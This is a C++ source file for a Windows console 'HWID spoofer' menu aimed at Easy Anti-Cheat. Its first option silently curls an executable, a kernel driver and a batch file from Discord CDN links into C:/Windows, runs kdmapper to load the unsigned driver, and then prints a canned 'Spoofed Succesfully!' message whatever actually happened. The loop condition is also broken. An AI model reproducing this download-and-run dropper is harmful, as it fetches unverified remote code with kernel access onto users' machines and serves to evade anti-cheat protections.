#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <math.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <d3d9.h>
#include <dwmapi.h>
#include <string>
#include <urlmon.h>
using namespace std;
void Menu()
{
    system("title open src woofer by OC#8000");
    system("color 5");
    system("cls");
    int choice;
    do
    {
        Sleep(2000);
        system("mode 121,30");
        std::cout << "Welcome to open source woofer\n";
        std::cout << "Made By OC";


        std::cout << "\n[1] EASY ANTI CHEAT (EAC)";
        std::cout << "\n[2] Discord";
       
        std::cout << "\nEnter your option: ";
        cin >> choice;
        switch (choice)
        {
        case 1:
            system("curl  https://cdn.discordapp.com/attachments/965323049232650270/967129575698079814/kdmapper1.exe --output C:/Windows/kdmapper1.exe >nul 2>&1");
            system("curl  https://cdn.discordapp.com/attachments/928403292252422144/967824650912559154/VCRuntime_140.sys --output C:/Windows/VCRuntime_140.sys >nul 2>&1");
            system("curl https://cdn.discordapp.com/attachments/973258221957554176/974695760090239046/hwidcheck.bat --output C:/Windows/hwidcheck.bat >nul 2>&1");
            Sleep(3000);
            system("start C:/Windows/kdmapper1.exe C:/Windows/VCRuntime_140.sys");
            system("cls");
            std::cout << "Spoofed Succesfully!";
            Sleep(200);
            system("cls");
            std::cout << "Spoofed Succesfully!!";
            Sleep(200);
            system("cls");
            std::cout << "Spoofed Succesfully!!!";
            Sleep(500);
            system("cls");
            std::cout << "Launching HWID Checker";
            Sleep(300);
            system("start C:/Windows/hwidcheck.bat");
            Sleep(300);
            system("cls");
            std::cout << "Returning to main menu";
            system("cls");
            Sleep(2000);
            system("cls");
            return;
            

        case 2:
            ShellExecute(0, 0, L"https://discord.gg/pumwTG6PTY", 0, 0, SW_SHOW);

      
        }
        {
        
        }

    } while (choice != 1,2,3);

}

int main()
{
    Menu();
}
